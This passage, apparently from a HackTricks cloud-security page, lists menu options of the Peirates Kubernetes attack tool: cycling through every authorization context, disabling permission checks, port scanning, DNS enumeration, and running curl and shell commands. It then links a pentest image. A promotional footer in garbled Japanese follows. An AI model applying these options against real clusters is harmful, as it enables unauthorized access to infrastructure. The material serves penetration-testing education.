[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```
* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)ã§<strong>AWSãƒãƒƒã‚­ãƒ³ã‚°ã‚’ã‚¼ãƒ­ã‹ã‚‰ãƒ’ãƒ¼ãƒ­ãƒ¼ã¾ã§å­¦ã¶</strong></a><strong>!</strong></summary>

HackTricksã‚’ã‚µãƒãƒ¼ãƒˆã™ã‚‹ä»–ã®æ–¹æ³•:

* **HackTricksã«ã‚ãªãŸã®ä¼šç¤¾ã‚’åºƒå‘Šã—ãŸã„**ã€ã¾ãŸã¯**HackTricksã‚’PDFã§ãƒ€ã‚¦ãƒ³ãƒ­ãƒ¼ãƒ‰ã—ãŸã„**å ´åˆã¯ã€[**ã‚µãƒ–ã‚¹ã‚¯ãƒªãƒ—ã‚·ãƒ§ãƒ³ãƒ—ãƒ©ãƒ³**](https://github.com/sponsors/carlospolop)ã‚’ãƒã‚§ãƒƒã‚¯ã—ã¦ãã ã•ã„ï¼
* [**å…¬å¼PEASS & HackTricksã‚°ãƒƒã‚º**](https://peass.creator-spring.com)ã‚’å…¥æ‰‹ã™ã‚‹
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)ã‚’ç™ºè¦‹ã—ã€ç‹¬å çš„ãª[**NFTs**](https://opensea.io/collection/the-peass-family)ã®ã‚³ãƒ¬ã‚¯ã‚·ãƒ§ãƒ³ã‚’ãƒã‚§ãƒƒã‚¯ã™ã‚‹
* ğŸ’¬ [**Discordã‚°ãƒ«ãƒ¼ãƒ—**](https://discord.gg/hRep4RUj7f)ã«**å‚åŠ ã™ã‚‹**ã‹ã€[**ãƒ†ãƒ¬ã‚°ãƒ©ãƒ ã‚°ãƒ«ãƒ¼ãƒ—**](https://t.me/peass)ã«å‚åŠ ã™ã‚‹ã€ã¾ãŸã¯**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/carlospolopm)ã‚’**ãƒ•ã‚©ãƒ­ãƒ¼ã™ã‚‹**ã€‚
* **HackTricks**ã®[**GitHubãƒªãƒã‚¸ãƒˆãƒª**](https://github.com/carlospolop/hacktricks)ã¨[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud)ã«PRã‚’æå‡ºã—ã¦ã€ã‚ãªãŸã®ãƒãƒƒã‚­ãƒ³ã‚°ã®ã‚³ãƒ„ã‚’å…±æœ‰ã™ã‚‹ã€‚

</details>
